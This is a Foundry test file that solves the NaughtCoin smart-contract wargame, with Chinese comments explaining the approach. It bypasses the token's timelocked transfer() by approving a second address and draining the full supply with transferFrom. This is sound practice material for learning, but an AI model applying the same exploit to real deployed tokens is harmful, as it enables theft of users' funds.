pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/NaughtCoin.sol";


/** 
 * 解题思路：绕过 transfer 方法，将额度授权给其他地址，使用 transfrom 方法
 */
contract HackNaughtCoinTest is Test {
    address hacker = address(1111111111111111111);
    address hacker2 = address(2222222222222222222);
    address hacker3 = address(3333333333333333333);
    NaughtCoin public nh;

    function setUp() public {
        vm.deal(hacker, 1 ether);
    }
    function testHackNaughtCoin() public {
        vm.startPrank(hacker);
        nh = new NaughtCoin(hacker);
        uint256 totalSupply = nh.INITIAL_SUPPLY();

        // 将额度授权给 hacker2 地址
        bool re1 = nh.approve(hacker2, totalSupply);
        assert(re1 == true);

        console.log("inituser address:");
        console.logAddress(hacker);
        console.logUint(nh.balanceOf(hacker));
        vm.stopPrank();

        // 从 hacker2 调用 transFrom 方法将资金转移出去
        vm.startPrank(hacker2);
        bool re2 = nh.transferFrom(hacker, hacker3, totalSupply);
        assert(re2 == true);
        assert(nh.balanceOf(hacker) == 0);
        vm.stopPrank();
    }
}